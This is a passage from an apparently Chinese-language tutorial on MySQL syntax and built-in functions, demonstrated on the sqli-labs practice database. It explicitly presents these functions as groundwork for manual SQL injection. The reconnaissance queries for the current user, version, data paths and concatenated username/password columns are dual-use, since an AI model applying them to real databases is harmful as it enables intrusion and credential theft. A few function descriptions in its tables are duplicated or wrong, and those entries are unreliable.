<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT name, COUNT(*) FROM table GROUP BY name;</span><br><span class="line">+--------+----------+</span><br><span class="line">| name   | COUNT(*) |</span><br><span class="line">+--------+----------+</span><br><span class="line">| 小丽 |        1 |</span><br><span class="line">| 小明 |        3 |</span><br><span class="line">| 小王 |        2 |</span><br><span class="line">+--------+----------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br></pre></td></tr></table></figure>
<p><strong>LIMIT 限制</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users order by id;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从第1条数据查询 查询2个数据</span></span><br><span class="line">mysql&gt; select * from users order by id <span class="built_in">limit</span> 0,2;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">+----+----------+------------+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从第2条数据查询 查询6个数据</span></span><br><span class="line">mysql&gt; select * from users order by id <span class="built_in">limit</span> 1,6;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">+----+----------+------------+</span><br></pre></td></tr></table></figure>
<p><strong>正则表达式</strong></p>
<p>在前面已经了解到 MySQL 可以通过 <code>LIKE ...%</code> 来进行模糊匹配。</p>
<p>MySQL 同样也支持正则表达式的匹配， MySQL 中使用 <code>REGEXP</code> 操作符来进行正则表达式匹配。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询所有 username 以 a 开头的数据</span></span><br><span class="line">select * from users <span class="built_in">where</span> username REGEXP <span class="string">'^a'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询所有 username 以 a 结尾的数据</span></span><br><span class="line">select * from users <span class="built_in">where</span> username REGEXP <span class="string">'a$'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询所有 username 包含 a 的数据</span></span><br><span class="line">select * from users <span class="built_in">where</span> username REGEXP <span class="string">'a'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询所有 username 0-9 结尾的数据</span></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">'[0-9]$'</span>;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  9 | admin1   | admin1   |</span><br><span class="line">| 10 | admin2   | admin2   |</span><br><span class="line">| 11 | admin3   | admin3   |</span><br><span class="line">| 14 | admin4   | admin4   |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
<p><strong>别名</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.5.53    |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select version() as <span class="string">'版本'</span>;</span><br><span class="line">+--------+</span><br><span class="line">| 版本   |</span><br><span class="line">+--------+</span><br><span class="line">| 5.5.53 |</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>MySQL中的注释符号有三种</p>
<ul>
<li><code># 这里是注释的内容</code></li>
<li><code>-- 这里是注释的内容</code></li>
<li><code>/*这里是注释的内容*/</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里是注释的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 这里是注释的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*这里是注释的内容*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这是一个</span></span><br><span class="line"><span class="comment">多行注释</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h1 id="MySQL-函数"><a href="#MySQL-函数" class="headerlink" title="MySQL 函数"></a>MySQL 函数</h1><p>MySQL 有很多内置的函数，灵活运行可以提高手工注入的效率。</p>
<h2 id="系统信息函数"><a href="#系统信息函数" class="headerlink" title="系统信息函数"></a>系统信息函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"># 返回数据库版本</span><br><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.5.53    |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line"># 返回当前数据库名</span><br><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| security   |</span><br><span class="line">+------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select schema();</span><br><span class="line">+----------+</span><br><span class="line">| schema() |</span><br><span class="line">+----------+</span><br><span class="line">| security |</span><br><span class="line">+----------+</span><br><span class="line"></span><br><span class="line"># 返回当前用户</span><br><span class="line">mysql&gt; select user();</span><br><span class="line">+----------------+</span><br><span class="line">| user()         |</span><br><span class="line">+----------------+</span><br><span class="line">| root@localhost |</span><br><span class="line">+----------------+</span><br><span class="line"></span><br><span class="line"># 返回当前用户</span><br><span class="line">mysql&gt; select current_user();  </span><br><span class="line">+----------------+</span><br><span class="line">| current_user() |</span><br><span class="line">+----------------+</span><br><span class="line">| root@localhost |</span><br><span class="line">+----------------+</span><br><span class="line"></span><br><span class="line"># 返回当前用户</span><br><span class="line">mysql&gt; select session_user();</span><br><span class="line">+----------------+</span><br><span class="line">| session_user() |</span><br><span class="line">+----------------+</span><br><span class="line">| root@localhost |</span><br><span class="line">+----------------+</span><br><span class="line"></span><br><span class="line"># 返回当前用户</span><br><span class="line">mysql&gt; select system_user();</span><br><span class="line">+----------------+</span><br><span class="line">| system_user()  |</span><br><span class="line">+----------------+</span><br><span class="line">| root@localhost |</span><br><span class="line">+----------------+</span><br><span class="line"></span><br><span class="line"># 查看当前用户连接信息</span><br><span class="line">mysql&gt; show processlist;</span><br><span class="line">+----+------+-------------------+----------+---------+------+-------+------------------+</span><br><span class="line">| Id | User | Host              | db       | Command | Time | State | Info             |</span><br><span class="line">+----+------+-------------------+----------+---------+------+-------+------------------+</span><br><span class="line">|  1 | root | 10.211.55.2:51246 | security | Query   |    0 | NULL  | show processlist |</span><br><span class="line">|  2 | root | localhost:49948   | NULL     | Sleep   |    7 |       | NULL             |</span><br><span class="line">+----+------+-------------------+----------+---------+------+-------+------------------+</span><br><span class="line"></span><br><span class="line"># 数据库路径</span><br><span class="line">mysql&gt; select @@datadir;</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| @@datadir                            |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| C:\myphp_www\PHPTutorial\MySQL\data\ |</span><br><span class="line">+--------------------------------------+</span><br><span class="line"></span><br><span class="line"># MySQL安装路径</span><br><span class="line">mysql&gt; select @@basedir;</span><br><span class="line">+---------------------------------+</span><br><span class="line">| @@basedir                       |</span><br><span class="line">+---------------------------------+</span><br><span class="line">| C:/myphp_www/PHPTutorial/MySQL/ |</span><br><span class="line">+---------------------------------+</span><br><span class="line"></span><br><span class="line"># 操作系统</span><br><span class="line">mysql&gt; select @@version_compile_os;</span><br><span class="line">+----------------------+</span><br><span class="line">| @@version_compile_os |</span><br><span class="line">+----------------------+</span><br><span class="line">| Win32                |</span><br><span class="line">+----------------------+</span><br><span class="line"></span><br><span class="line"># 返回md5加密后的字符串</span><br><span class="line">mysql&gt; select md5(233);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| md5(233)                         |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| e165421110ba03099a1c0393373c5b43 |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure>
<h2 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h2><table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>FLOOR(X)</td>
<td>返回不大于X的最大整数。</td>
</tr>
<tr>
<td>RAND()</td>
<td>返回0~1的随机数</td>
</tr>
<tr>
<td>ROUND(X)</td>
<td>返回离X最近的整数，截断时要进行四舍五入。</td>
</tr>
</tbody>
</table>
<p>简单演示：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select round(1.4);</span><br><span class="line">+------------+</span><br><span class="line">| round(1.4) |</span><br><span class="line">+------------+</span><br><span class="line">|          1 |</span><br><span class="line">+------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select round(1.5);</span><br><span class="line">+------------+</span><br><span class="line">| round(1.5) |</span><br><span class="line">+------------+</span><br><span class="line">|          2 |</span><br><span class="line">+------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
<h2 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h2><table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>COUNT(expr)</td>
<td>返回查询结果的行数</td>
</tr>
</tbody>
</table>
<p>简单演示</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from users;</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| count(*) |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">|       13 |</span><br><span class="line">+<span class="comment">----------+</span></span><br></pre></td></tr></table></figure>
<h2 id="日期时间函数"><a href="#日期时间函数" class="headerlink" title="日期时间函数"></a>日期时间函数</h2><table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>CURDATE()、CURRENT_DATE()</td>
<td>返回当前日期，格式：yyyy-MM-dd</td>
</tr>
<tr>
<td>CURTIME()、CURRENT_TIME()</td>
<td>返回当前时间，格式：HH:mm:ss</td>
</tr>
<tr>
<td>NOW()</td>
<td>返回当前日期和时间，格式：yyyy-MM-dd HH:mm:ss</td>
</tr>
</tbody>
</table>
<h2 id="编码转换函数"><a href="#编码转换函数" class="headerlink" title="编码转换函数"></a>编码转换函数</h2><table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>BIN(X)</td>
<td>返回X的二进制信息</td>
</tr>
<tr>
<td>CONV(N,from_base,to_base)</td>
<td>将N从from_base转换成to_base格式</td>
</tr>
<tr>
<td>HEX(X)</td>
<td>返回X的十六进制信息</td>
</tr>
<tr>
<td>MD5(X)</td>
<td>返回X的MD5信息</td>
</tr>
<tr>
<td>UNHEX(X)</td>
<td>对X进行十六进制解码</td>
</tr>
</tbody>
</table>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select hex(<span class="string">'MySQL'</span>);</span><br><span class="line">+--------------+</span><br><span class="line">| hex(<span class="string">'MySQL'</span>) |</span><br><span class="line">+--------------+</span><br><span class="line">| 4D7953514C   |</span><br><span class="line">+--------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(<span class="string">'4D7953514C'</span>);</span><br><span class="line">+---------------------+</span><br><span class="line">| unhex(<span class="string">'4D7953514C'</span>) |</span><br><span class="line">+---------------------+</span><br><span class="line">| MySQL               |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select x<span class="string">'4D7953514C'</span>;</span><br><span class="line">+---------------+</span><br><span class="line">| x<span class="string">'4D7953514C'</span> |</span><br><span class="line">+---------------+</span><br><span class="line">| MySQL         |</span><br><span class="line">+---------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 0x4D7953514C;</span><br><span class="line">+--------------+</span><br><span class="line">| 0x4D7953514C |</span><br><span class="line">+--------------+</span><br><span class="line">| MySQL        |</span><br><span class="line">+--------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select hex(233);</span><br><span class="line">+----------+</span><br><span class="line">| hex(233) |</span><br><span class="line">+----------+</span><br><span class="line">| E9       |</span><br><span class="line">+----------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select conv(<span class="string">'E9'</span>,16,10);</span><br><span class="line">+------------------+</span><br><span class="line">| conv(<span class="string">'E9'</span>,16,10) |</span><br><span class="line">+------------------+</span><br><span class="line">| 233              |</span><br><span class="line">+------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select conv(<span class="string">'E9'</span>,16,2);</span><br><span class="line">+-----------------+</span><br><span class="line">| conv(<span class="string">'E9'</span>,16,2) |</span><br><span class="line">+-----------------+</span><br><span class="line">| 11101001        |</span><br><span class="line">+-----------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select conv(<span class="string">'E9'</span>,16,8);</span><br><span class="line">+-----------------+</span><br><span class="line">| conv(<span class="string">'E9'</span>,16,8) |</span><br><span class="line">+-----------------+</span><br><span class="line">| 351             |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure>
<h2 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h2><table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>ASCII(s)</td>
<td>返回字符串 s 的第一个字符的 ASCII 码</td>
</tr>
<tr>
<td>CONCAT(s1,s2…sn)</td>
<td>字符串 s1,s2 等多个字符串合并为一个字符串</td>
</tr>
<tr>
<td>CONCAT_WS(x, s1,s2…sn)</td>
<td>同 CONCAT(s1,s2,…) 函数，但是每个字符串直接要加上 x，x 可以是分隔符</td>
</tr>
<tr>
<td>GROUP_CONCAT(str1,str2,…)</td>
<td>函数返回一个字符串结果，默认查询所有结果。</td>
</tr>
<tr>
<td>LEFT(s,n)</td>
<td>返回字符串 s 的前 n 个字符</td>
</tr>
<tr>
<td>LENGTH(s)</td>
<td>返回字符串 s 的前 n 个字符</td>
</tr>
<tr>
<td>LENGTH(s)</td>
<td>返回字符串 s 的长度</td>
</tr>
<tr>
<td>MID(s,n,len)</td>
<td>从字符串 s 的 start 位置截取长度为 length 的子字符串</td>
</tr>
<tr>
<td>RIGHT(s,n)</td>
<td>返回字符串 s 的后 n 个字符</td>
</tr>
<tr>
<td>RTRIM(s)</td>
<td>返回字符串 s 的后 n 个字符</td>
</tr>
<tr>
<td>STRCMP(s1,s2)</td>
<td>比较字符串 s1 和 s2，如果 s1 与 s2 相等返回 0 ，如果 s1&gt;s2 返回 1，如果 s1&lt;s2 返回 -1</td>
</tr>
<tr>
<td>SUBSTR(s, start, length)</td>
<td>从字符串 s 的 start 位置截取长度为 length 的子字符串</td>
</tr>
<tr>
<td>TRIM(s)</td>
<td>去掉字符串 s 开始和结尾处的空格</td>
</tr>
<tr>
<td>RTRIM(s)</td>
<td>去掉字符串 s 结尾处的空格</td>
</tr>
</tbody>
</table>
<p>简单的演示：</p>
<p><strong>ASCII(s)</strong></p>
<p>返回字符串 s 的第一个字符的 ASCII 码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ascii(version());</span><br><span class="line">+------------------+</span><br><span class="line">| ascii(version()) |</span><br><span class="line">+------------------+</span><br><span class="line">|               53 |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>
<p><strong>CONCAT(s1,s2…sn)</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(user(),version(),database());</span><br></pre></td></tr></table></figure>
<p><strong>CONCAT_WS(x, s1,s2…sn)</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&apos;   &apos;,user(),version(),database());</span><br></pre></td></tr></table></figure>
<p><strong>GROUP_CONCAT(str1,str2,…)</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select group_concat(user(),version(),database());</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| group_concat(user(),version(),database()) |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| root@10.211.55.25.5.53security            |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line"></span><br><span class="line">SELECT GROUP_CONCAT(id,username,password) AS users FROM users;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>嫌太挤可以用空格<code>&lt;br&gt;</code> 或者<code>&#39;:&#39;</code>分隔开</p>
</blockquote>
<p><strong>LEFT(s,n)</strong></p>
<p>返回字符串 s 的前 n 个字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select left(user(),4);</span><br></pre></td></tr></table></figure>
<p><strong>LENGTH(s)</strong></p>
<p>返回字符串 s 的长度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select length(user());</span><br></pre></td></tr></table></figure>
<p><strong>MID(s,n,len)</strong></p>
<p>从字符串 s 的 start 位置截取长度为 length 的子字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select mid(user(),5,10);</span><br></pre></td></tr></table></figure>
<p><strong>RIGHT(s,n)</strong></p>
<p>返回字符串 s 的后 n 个字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select right(user(),10);</span><br></pre></td></tr></table></figure>
<p><strong>RTRIM(s)</strong></p>
<p>去掉字符串 s 结尾处的空格</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rtrim(&quot;Good Day    &quot;) as A;</span><br></pre></td></tr></table></figure>
<p><strong>STRCMP(s1,s2)</strong></p>
<p>比较字符串 s1 和 s2，如果 s1 与 s2 相等返回 0 ，如果 s1&gt;s2 返回 1，如果 s1&lt;s2 返回 -1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.5.53    |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select strcmp(&apos;5.5.53&apos;,version());</span><br><span class="line">+----------------------------+</span><br><span class="line">| strcmp(&apos;5.5.53&apos;,version()) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                          0 |</span><br><span class="line">+----------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select strcmp(&apos;4&apos;,version());</span><br><span class="line">+-----------------------+</span><br><span class="line">| strcmp(&apos;4&apos;,version()) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                    -1 |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select strcmp(&apos;6&apos;,version());</span><br><span class="line">+-----------------------+</span><br><span class="line">| strcmp(&apos;6&apos;,version()) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     1 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure>
<p><strong>SUBSTR(s, start, length)</strong></p>
<p>从字符串 s 的 start 位置截取长度为 length 的子字符串</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select substr(user(),1,4);</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| substr(user(),1,4) |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| root               |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br></pre></td></tr></table></figure>
<p><strong>TRIM(s)</strong></p>
<p>去掉字符串 s 开始和结尾处的空格</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select trim(&apos;Good Good Study! &apos;) as trim;</span><br></pre></td></tr></table></figure>
<h2 id="流程函数"><a href="#流程函数" class="headerlink" title="流程函数"></a>流程函数</h2><p><strong>IF(expr,v1,v2)</strong></p>
<p>如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2。</p>
